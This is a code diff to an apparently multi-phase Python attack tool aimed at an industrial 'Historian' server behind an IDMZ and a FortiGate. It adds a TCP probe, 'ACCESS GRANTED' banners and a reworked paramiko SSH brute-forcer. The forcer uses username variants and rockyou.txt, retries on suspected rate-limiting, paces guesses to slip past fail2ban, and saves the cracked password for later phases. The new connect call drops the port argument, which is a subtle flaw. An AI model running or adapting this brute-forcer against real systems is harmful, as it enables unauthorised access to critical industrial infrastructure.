@@ -7,6 +7,7 @@ import os
 import time
 import json
 import argparse
+import socket
 from datetime import datetime
 from dataclasses import dataclass, field
 from typing import Optional
@@ -481,6 +482,39 @@ def phase2_idmz_recon() -> PhaseResult:
     return r
 
 
+def _tcp_reachable(ip: str, port: int, timeout: float = 1.0) -> bool:
+    """Quick socket test — returns True if TCP port is open and accepting."""
+    try:
+        with socket.create_connection((ip, port), timeout=timeout):
+            return True
+    except (socket.timeout, ConnectionRefusedError, OSError):
+        return False
+
+
+BRUTE_BANNER = """\
+  ___ ___ ___ _   _ _____ ___   ___ ___  ___ ___ ___
+ | _ ) _ \\ | | | |_   _| __| | __/ _ \\| _ \\ __/ __|
+ | _ \\   / |_| |   | | | _|  | _| (_) |   / _|\\__ \\
+ |___/_|_\\\\___/    |_| |___| |_|_\\___/|_|_\\___|___/
+
+     ___    _   ___ _  __     _    ___  _  _____ ___
+    / __|  /_\\ / __| |/ /    /_\\  |   \\| ||_ _| _ \\\ 
+   | (__  / _ \\ (__| ' <    / _ \\ | |) | |__| ||   /
+    \\___/_/ \\_ \\___|_|\\_\\  /_/ \\_\\|___/|____|___|_|_\\
+"""
+
+LOCK_ART = """\
+        +-----+
+        |     |
+        | OT  |
+        |HIST |
+     +--+-----+--+
+     |  LOCKED   |
+     |  TARGET   |
+     +-----------+
+"""
+
+
 def _ssh_bruteforce(
     ip: str,
     port: int,
@@ -489,90 +523,107 @@ def _ssh_bruteforce(
     delay: float = 0.2,
 ) -> str | None:
     """
-    Sequential paramiko SSH brute forcer.
-    - Strict top-to-bottom order, zero out-of-order attempts
-    - Each password tried exactly once — no re-queuing, no retries on auth fail
-    - Stops and returns the password the instant SSH accepts it
-    - delay: seconds to pause between attempts (avoids triggering fail2ban)
+    Sequential paramiko SSH brute forcer with rich Progress bar.
+    - AuthenticationException  → wrong password, skip
+    - SSHException              → possible rate-limit, wait 1s and retry same password
+    - timeout / connection err  → abort after 3 consecutive failures
     """
-    # Quick-check common variations before opening the wordlist
     priority = ["", username, username[::-1], f"{username}123", "password", "admin123"]
 
     try:
         with open(wordlist_path, errors="ignore") as f:
             wordlist = [line.strip() for line in f if line.strip()]
     except (FileNotFoundError, OSError):
-        wordlist = []  # priority list will still run
+        wordlist = []
 
-    candidates = priority + wordlist
-    total      = len(candidates)
-    seen: set[str] = set()
+    candidates = list(dict.fromkeys(priority + wordlist))  # ordered dedup
+    total = len(candidates)
+    MAX_CONSECUTIVE_TIMEOUTS = 3
 
-    status_line = Text()
+    consecutive_timeouts = 0
+    found_password: str | None = None
 
-    with Live(status_line, console=console, refresh_per_second=8) as live:
-        for idx, pw in enumerate(candidates, 1):
-            if pw in seen:
-                continue
-            seen.add(pw)
+    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TaskProgressColumn, TimeElapsedColumn
 
-            status_line = Text.assemble(
-                ("  Attempting ", "dim"),
-                (f"[{idx}/{total}]", "bold cyan"),
-                ("  ", ""),
-                (f"{username}", "yellow"),
-                (":", "dim"),
-                (pw, "white"),
+    with Progress(
+        SpinnerColumn(),
+        TextColumn("[bold cyan]{task.description}"),
+        BarColumn(bar_width=28),
+        TaskProgressColumn(),
+        TimeElapsedColumn(),
+        console=console,
+        transient=False,
+    ) as progress:
+        task = progress.add_task(
+            f"Attempting {username}@{ip}", total=total
+        )
+
+        for pw in candidates:
+            if progress.finished:
+                break
+
+            progress.update(
+                task,
+                description=f"[bold cyan]Attempting: {username}@{ip}  password: {pw}[/bold cyan]",
             )
-            live.update(status_line)
 
-            try:
-                client = paramiko.SSHClient()
-                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                client.connect(
-                    hostname=ip,
-                    port=port,
-                    username=username,
-                    password=pw,
-                    timeout=6,
-                    allow_agent=False,    # don't try SSH agent keys
-                    look_for_keys=False,  # don't try ~/.ssh/id_rsa etc.
-                    banner_timeout=8,
-                )
-                client.close()
-                live.update(Text.assemble(
-                    (" [+] ", "bold green"),
-                    ("HIT — ", "green"),
-                    (f"{username}:{pw}", "bold white"),
-                    (f"  (attempt #{idx})", "dim"),
-                ))
-                return pw
+            retry = True
+            while retry:
+                retry = False
+                try:
+                    client = paramiko.SSHClient()
+                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                    client.connect(
+                        hostname=ip,
+                        username=username,
+                        password=pw,
+                        timeout=3,
+                        allow_agent=False,
+                        look_for_keys=False,
+                        banner_timeout=3,
+                    )
+                    client.close()
+                    consecutive_timeouts = 0
+                    found_password = pw
+                    progress.update(task, completed=total,
+                                    description=f"[bold green]FOUND: {username}@{ip}  password: {pw}[/bold green]")
+                    break  # exit while
 
-            except paramiko.AuthenticationException:
-                # Clean auth rejection — do NOT retry, just move on
-                time.sleep(delay)
+                except paramiko.AuthenticationException:
+                    # Wrong password — clean rejection, move on
+                    consecutive_timeouts = 0
+                    time.sleep(delay)
 
-            except paramiko.ssh_exception.NoValidConnectionsError:
-                live.update(Text.assemble(
-                    (" [!] ", "bold yellow"),
-                    (f"SSH unreachable at {ip}:{port} — check connectivity", "yellow"),
-                ))
-                time.sleep(2)
+                except paramiko.SSHException:
+                    # Possible rate-limit on Historian — wait 1s and retry same pw
+                    progress.update(task,
+                        description=f"[yellow]SSHException (rate-limit?) — retrying {pw} in 1s[/yellow]")
+                    time.sleep(1)
+                    retry = True
 
-            except Exception as e:
-                # Transient error (banner timeout, reset) — log and skip, do NOT retry
-                live.update(Text.assemble(
-                    (" [!] ", "bold yellow"),
-                    (f"Skipping attempt {idx} ({type(e).__name__}): {e}", "dim yellow"),
-                ))
-                time.sleep(1)
+                except (socket.timeout, paramiko.ssh_exception.NoValidConnectionsError, OSError):
+                    consecutive_timeouts += 1
+                    progress.update(task,
+                        description=f"[yellow]Timeout {consecutive_timeouts}/{MAX_CONSECUTIVE_TIMEOUTS} on {ip}:{port}[/yellow]")
+                    if consecutive_timeouts >= MAX_CONSECUTIVE_TIMEOUTS:
+                        progress.update(task,
+                            description=f"[red]Network blocked — aborting[/red]")
+                        return None
+                    time.sleep(1)
 
-    return None
+            if found_password is not None:
+                break
+            progress.advance(task)
+
+    return found_password
 
 
 def phase3_ssh_bruteforce() -> PhaseResult:
     phase_header(3, "SSH Brute Force on Historian (paramiko)")
     r = PhaseResult("SSH Brute Force")
+
+    console.print(f"[cyan]{LOCK_ART}[/cyan]")
+    console.print(f"[bold red]{BRUTE_BANNER}[/bold red]")
 
     ip   = CFG["historian"]["ip"]
     port = CFG["historian"]["port"]
@@ -581,21 +632,48 @@ def phase3_ssh_bruteforce() -> PhaseResult:
 
     info(f"Target: {user}@{ip}:{port}")
 
-    if wl:
-        info(f"Wordlist: {wl}")
-    else:
-        warn("rockyou.txt not found — running priority-list only (empty/username/common)")
-        wl = "/dev/null"  # _ssh_bruteforce handles missing file gracefully
+    # ── Fail-fast: abort if Phase 2 marked host down ───────────────────────────
+    last_phase2 = next(
+        (res for res in reversed(results) if res.phase == "IDMZ Recon"), None
+    )
+    if last_phase2 and last_phase2.status == "failed":
+        r.status  = "failed"
+        r.finding = f"Target unreachable — Phase 2 reported {ip} as down, skipping"
+        err(r.finding)
+        return r
 
-    info("Order: empty → username → reversed → common → wordlist (top to bottom, no repeats)")
+    # ── Fail-fast: 1-second TCP socket probe ──────────────────────────────────
+    info(f"TCP probe → {user}@{ip}:{port} ...")
+    if not _tcp_reachable(ip=ip, port=port, timeout=1.0):
+        r.status  = "failed"
+        r.finding = f"Target unreachable — {ip}:{port} timed out (FortiGate may be blocking)"
+        err(r.finding)
+        return r
+    ok(f"Port {port} open on {ip} — starting brute force")
+
+    if not wl:
+        warn("rockyou.txt not found — running priority-list only")
+        wl = "/dev/null"
+    else:
+        info(f"Wordlist: {wl}")
 
     found_pw = _ssh_bruteforce(ip=ip, port=port, username=user, wordlist_path=wl)
 
     if found_pw is not None:
+        # ── ACCESS GRANTED panel ───────────────────────────────────────────────
+        console.clear()
+        console.print(Panel(
+            f"\n[bold white]  ACCESS GRANTED  \n\n"
+            f"  User  : [bold yellow]{user}[/bold yellow]\n"
+            f"  Host  : [bold yellow]{ip}:{port}[/bold yellow]\n"
+            f"  Pass  : [bold yellow]{found_pw}[/bold yellow]\n",
+            title="[bold white] SSH COMPROMISED [/bold white]",
+            border_style="bold green",
+            expand=False,
+            padding=(1, 4),
+        ))
         r.status  = "success"
         r.finding = f"Credentials confirmed: {user}:{found_pw}"
-        ok(r.finding)
-        # Write discovered password back to CFG so later phases use it
         CFG["historian"]["password"] = found_pw
     else:
         r.status  = "failed"
